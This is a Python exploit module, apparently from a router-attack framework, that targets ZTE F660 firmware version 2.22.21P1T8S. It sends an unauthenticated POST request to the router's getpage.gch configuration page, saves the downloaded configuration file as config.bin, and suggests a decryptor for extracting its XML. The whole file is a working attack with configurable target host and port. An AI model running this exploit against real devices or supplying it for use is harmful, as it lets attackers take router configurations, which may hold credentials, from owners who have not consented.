# Name:ZTE F660 remote config download
# File:f660_config_download.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 25.12.2015
# Last modified: 25.12.2015
# Shodan Dork:
# Description: ZTE F660 firmware Version: 2.22.21P1T8S does not check Cookies And Credentials on POST
# Based on: https://www.exploit-db.com/exploits/36978/

import core.Exploit
import core.io

import requests
from interface.messages import print_error, print_success, print_warning, print_info


class Exploit(core.Exploit.RextExploit):
    """
Name:ZTE F660 remote config download
File:f660_config_download.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 25.12.2015
Description: ZTE F660 firmware Version: 2.22.21P1T8S does not check Cookies And Credentials on POST
Based on: https://www.exploit-db.com/exploits/36978/

Options:
    Name        Description

    host        Target host address
    port        Target port
    """

    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_run(self, e):
        url = "http://%s:%s/getpage.gch?pid=101&nextpage=manager_dev_config_t.gch" % (self.host, self.port)

        try:
            print_warning("Sending exploit")
            # It took me longer than necessary to find out how to use Content-Disposition properly
            # Always set stream=True otherwise you may not get the whole file
            response = requests.post(url, files={'config': ''}, timeout=60, stream=True)
            if response.status_code == 200:
                if response.headers.get('Content-Disposition'):
                    print_success("got file in response")
                    print_info("Writing file to config.bin")
                    core.io.writefile(response.content, "config.bin")
                    print_success("you can now use decryptors/zte/config_zlib_decompress to extract XML")
        except requests.ConnectionError as e:
            print_error("connection error %s" % e)
        except requests.Timeout:
            print_error("timeout")
Exploit()
